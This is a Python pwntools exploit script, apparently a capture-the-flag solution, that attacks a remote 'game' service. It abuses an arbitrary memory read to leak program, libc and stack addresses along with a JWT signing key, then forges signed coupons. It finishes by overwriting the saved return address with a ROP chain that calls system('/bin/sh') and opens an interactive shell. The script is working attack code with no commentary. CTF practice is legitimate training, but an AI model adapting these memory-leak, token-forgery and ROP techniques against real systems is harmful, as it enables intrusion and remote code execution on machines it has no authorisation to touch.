from pwn import *
from os import urandom
from tqdm import tqdm
import jwt

# context.log_level = 0

e = ELF('./game')
libc = e.libc

# p = remote('192.168.63.1', 9999)
# p = remote('35.200.72.53', 9999)
p = remote('34.146.158.184', 9999)
# p = e.process()


offset = 0x2BAFE
init_array = 0x3E2A0

def use_coupon(coupon):
    p.sendlineafter(b"Choice : ", b"3")
    p.sendlineafter(b"[*] Enter your coupon : \r\n", bytes(coupon))

def login(_id, _pw):
    p.sendlineafter(b'Choice : ', b'2')
    p.sendlineafter(b"id:\r\n", _id)
    # pause()
    p.sendlineafter(b"pw:\r\n", _pw)

ID = 0

def aar(idx):
    # context.log_level = 0
    global ID
    p.sendlineafter(b"Choice : ", b"1")
    p.sendlineafter(b"1. Id:\r\n", str(ID).encode())
    p.sendlineafter(b"2. Pw:\r\n", b"1")
    p.sendlineafter(b"3. Email:\r\n", str(ID).encode())
    p.sendlineafter(b"4. Age:\r\n", str(idx).encode())
    # p.sendlineafter(b"4. Age:\r\n", str(34).encode())

    p.recvuntil(b"A membership sign-up coupon has been issued : ")
    coupon = p.recvuntil(b"\r\n")[0:-2]
    print(coupon.decode())
    coupon = bytearray(coupon)

    p.sendlineafter(b"Choice : ", b"2")
    p.sendlineafter(b"id:\r\n", str(ID).encode())
    p.sendlineafter(b"pw:\r\n", b"1")
    
    ID += 1

    for _ in range(4):
        use_coupon(coupon)
        coupon[-1] += 1

    # context.log_level = 20
    p.sendlineafter(b"Choice : ", b"2")
    # end = 0
    p.sendafter(b'||', b'ssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawwwwwwwwwwwwwwwwddddddddddddddddddddddddddddddddddssssssssssssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaafffffff\n')

    p.recvuntil(b'||')
    for _ in tqdm(range(3608)):
        p.recvuntil(b'||')
        p.recvuntil(b'||')

    # p.interactive()

    # while not end:
    #     print(p.recvuntil(b'||').decode().replace('',''))
    #     while 1:
    #         x = input()
    #         if x == 'ff':
    #             p.send(b'ff\n')
    #             end = 1
    #             break
    #         elif x in 'wasd' and len(x) == 1:
    #             p.send(x.encode())
    #             break
    #     p.recvuntil(b'||')

    x = p.recvuntil(b'Game Over!')
    # print(x.decode())
    # input()
    while 1:
        x = p.recvuntil(b'member? : \r\n', timeout=1)
        if not x:
            break

    # context.log_level = 0
    # p.interactive()
    p.sendline(b'Y')
    p.sendlineafter(b'Choice : \r\n', b'6')
    x = p.recvuntil(b'age :', timeout=1)
    if not x:
        exit('sugo zz')
    data = p.recvuntil(b'\nemail', drop=True)

    p.sendlineafter(b"Choice : ", b"1")
    # context.log_level = 20
    return data

# p.recvlines(75*1222)

x = aar(init_array - offset)
init_array_0 = int.from_bytes(x, 'little')
pie = init_array_0 - 0x7360
print(f'[+] {pie=:#014x}')
x = aar(0x3EA88 - offset)
setvbuf = int.from_bytes(x, 'little')
print(f'[+] {setvbuf=:#014x}')

offset += pie
libc.address = setvbuf - libc.symbols['setvbuf']
print(f'[+] libc={libc.address:#014x}')

x = aar(libc.symbols['environ'] - offset)
environ = int.from_bytes(x, 'little')
print(f'[+] {environ=:#014x}')

# admin_pw = aar(environ - 0xeb8 - offset)
# print(f'[+] {admin_pw=}')

x = aar(environ - 0xec8 + 0xd50 - offset)
key_ptr = int.from_bytes(x, 'little')
print(f'[+] {key_ptr=:#x}')
key = aar(key_ptr - offset)
print(f'[+] {key=}')

game = environ - 0xec8
RET = game + 0xda8

backup = []

for i in range(4):
    p.sendlineafter(b"Choice : ", b"1")

    _id = urandom(8).hex()
    p.sendlineafter(b"1. Id:\r\n", _id.encode())
    p.sendlineafter(b"2. Pw:\r\n", b"1")
    p.sendlineafter(b"3. Email:\r\n", b'DD')
    p.sendlineafter(b"4. Age:\r\n", str(RET + i * 8 - offset).encode())

    login(_id, b'1')
    
    for _ in range(10):
        coupon = jwt.encode({"iss":"linectf","userid":_id,urandom(8).hex():'hi'}, key, 'HS256').encode()
        print(coupon)
        use_coupon(coupon)

    p.sendlineafter(b"Choice : ", b"2")
    p.sendafter(b'||', b'fffffffffffffffffffffff\n')
    x = p.recvuntil(b'Game Over!')
    x = p.recvuntil(b'member? : \r\n', timeout=1)
    x = p.recvuntil(b'member? : \r\n', timeout=1)
    p.sendline(b'Y')


    p.sendlineafter(b'Choice : \r\n', b'6')
    x = p.recvuntil(b'age :', timeout=1)
    if not x:
        exit('sugo zz')
    data = p.recvuntil(b'\nemail', drop=True)
    backup.append(data)

    p.sendlineafter(b"Choice : ", b"1")

            



print(f'[!] game_structure @ {environ - 0xec8:#x}')

login(b'Welcome!', (p64(environ - 0xec8 + 0x10) + p64(8))[:10])


for _ in range(10):
    coupon = jwt.encode({"iss":"linectf","userid":'Welcome!',urandom(8).hex():'hi'}, key, 'HS256').encode()
    print(coupon)
    use_coupon(coupon)

p.sendlineafter(b"Choice : ", b"2")
p.sendafter(b'||', b'fffffffffffffffffffffff\n')
x = p.recvuntil(b'Game Over!')
x = p.recvuntil(b'member? : \r\n', timeout=1)
x = p.recvuntil(b'member? : \r\n', timeout=1)
p.sendline(b'Y')


rdi = libc.address + 0x000000000002a3e5
ret = libc.address + 0x0000000000029139
binsh = next(libc.search(b'/bin/sh\x00'))

backup[3] = int.to_bytes(0x0000000100000000, 8, 'little')

rop = [ret, rdi, binsh, libc.symbols['system']]

for i in range(4):
    p.sendlineafter(b"Choice : ", b"5")
    p.sendline(b'Y')
    p.sendline(p64(RET + i * 8).rstrip(b'\x00'))

    p.sendlineafter(b"Choice : ", b"1")

    print(backup)
    if i == 0:
        admin_pw = backup[i]
    else:
        admin_pw = b'\x00' + backup[i][1:]
    login(b'admin', admin_pw.ljust(8, b'\x00'))

    # p.interactive()

    p.sendlineafter(b"Choice : ", b"5")
    # p.sendline(b"5")
    p.sendline(b'Y')
    p.sendline(p64(rop[i]))

    p.sendlineafter(b"Choice : ", b"1")

    login(b'Welcome!', (p64(RET + i * 8) + p64(8))[:6])

    # p.interactive()


p.sendlineafter(b"Choice : ", b"5")
p.sendline(b'Y')
p.sendline(p64(0)[:6])


p.interactive()